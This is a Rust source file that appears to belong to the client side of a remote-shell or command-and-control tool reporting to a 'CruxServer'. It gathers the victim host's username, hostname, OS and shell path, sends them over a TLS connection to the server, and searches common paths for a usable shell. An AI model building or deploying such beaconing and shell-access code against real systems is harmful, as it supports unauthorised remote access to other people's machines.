#[path = "../utils/mod.rs"]
mod utils;
use subprocess::{ExitStatus};
use native_tls::{TlsConnector, TlsStream};
use whoami::{self, fallible};

use std::path::Path;
use std::net::{TcpStream};

use utils::network::{write_length_prefix};
use utils::data::{Metadata, Message, os_detect};

pub fn send_metadata(shell: &str, stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Prepare Metadata
    let metadata = Metadata {
        username: whoami::username(),
        hostname: fallible::hostname().map_or("UNKNOWN_HOSTNAME".to_string(),|d| d),
        os_type: os_detect(),
        shell_path: shell.to_string()
    };
    let metadata_serial = serde_json::to_string(&metadata)?;

    // Send metadata back to CruxServer
    let _ = write_length_prefix(stream, &metadata_serial.as_bytes());
    Ok(())
}

pub fn normalize_exit_code(status: ExitStatus) -> i64 {
    match status {
        ExitStatus::Exited(code) => code.into(),
        ExitStatus::Signaled(sig) => <u8 as Into<i64>>::into(sig)*-1,
        ExitStatus::Other(code) => code.into(),
        ExitStatus::Undetermined => -1,
    }
}

pub fn choose_shell() -> Result<String, Box<dyn std::error::Error>> {
    let candiates = [
        "/bin/bash",
        "/usr/bin/bash",
        "/bin/sh",
        "/usr/bin/sh",
        "/bin/zsh",
        "/usr/bin/zsh",
        "/bin/dash",
        "/usr/bin/dash",
        "/bin/ash",
        "/usr/bin/ash",
        "/bin/busybox",
        "/usr/bin/busybox",
    ];

    for shell in &candiates {
        if Path::new(&shell).exists() {
            return Ok(shell.to_string());
        }
    }
    return Err("No shell found".into())
}
